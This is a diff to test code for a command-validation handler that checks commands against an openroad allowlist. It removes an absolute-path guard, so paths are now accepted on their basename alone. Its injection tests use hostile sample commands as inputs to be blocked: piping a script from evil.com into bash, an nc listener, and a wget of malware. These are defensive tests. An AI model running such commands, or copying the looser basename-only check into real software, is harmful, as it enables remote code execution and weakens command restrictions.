@@ -23,9 +23,8 @@ describe("command validation", () => {
       makeHandler().validateCommand(["openroad", "-no_init"]);
     });
 
-    it("throws for absolute path even if basename matches an allowed command", () => {
-      expect(() => makeHandler().validateCommand(["/usr/bin/openroad", "-no_init"])).toThrow(PTYError);
-      expect(() => makeHandler().validateCommand(["/usr/bin/openroad", "-no_init"])).toThrow("absolute path");
+    it("passes for absolute path when basename is an allowed command", () => {
+      makeHandler().validateCommand(["/usr/bin/openroad", "-no_init"]);
     });
 
     it("passes for valid flags and file arguments", () => {
@@ -46,9 +45,9 @@ describe("command validation", () => {
       expect(() => makeHandler().validateCommand(["sh"])).toThrow("not in the allowed commands list");
     });
 
-    it("throws for absolute path to disallowed command (absolute path check fires first)", () => {
+    it("throws for absolute path to disallowed command", () => {
       expect(() => makeHandler().validateCommand(["/bin/bash", "-c", "echo hello"])).toThrow(
-        "absolute path",
+        "not in the allowed commands list",
       );
     });
   });
@@ -171,16 +170,14 @@ describe("command injection prevention", () => {
   });
 
   it("blocks executing arbitrary binaries", () => {
-    // Absolute paths are caught by the absolute-path guard (fires before allowlist check)
     expect(() =>
       makeHandler().validateCommand(["/bin/bash", "-c", "curl evil.com/shell.sh | bash"]),
-    ).toThrow("absolute path");
+    ).toThrow("not in the allowed commands list");
 
     expect(() =>
       makeHandler().validateCommand(["/usr/bin/nc", "-l", "4444"]),
-    ).toThrow("absolute path");
+    ).toThrow("not in the allowed commands list");
 
-    // Plain binary names not in the allowlist are caught by the allowlist check
     expect(() =>
       makeHandler().validateCommand(["wget", "http://evil.com/malware"]),
     ).toThrow("not in the allowed commands list");
